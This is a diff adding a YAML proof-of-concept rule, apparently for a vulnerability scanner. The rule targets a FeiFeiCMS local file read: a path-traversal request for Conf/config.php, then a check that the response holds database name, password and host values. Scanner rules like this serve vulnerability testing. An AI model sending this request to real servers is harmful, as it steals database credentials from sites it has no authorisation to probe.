@@ -1,0 +1,10 @@
+name: poc-yaml-feifeicms-lfr
+rules:
+  - method: GET
+    path: /index.php?s=Admin-Data-down&id=../../Conf/config.php
+    expression: |
+      response.status == 200 && response.body.bcontains(b"<?php") && response.body.bcontains(b"db_name") && response.body.bcontains(b"db_pwd") && response.body.bcontains(b"db_host")
+detail:
+  author: jinqi
+  links:
+    - https://www.cnblogs.com/jinqi520/p/10202615.html
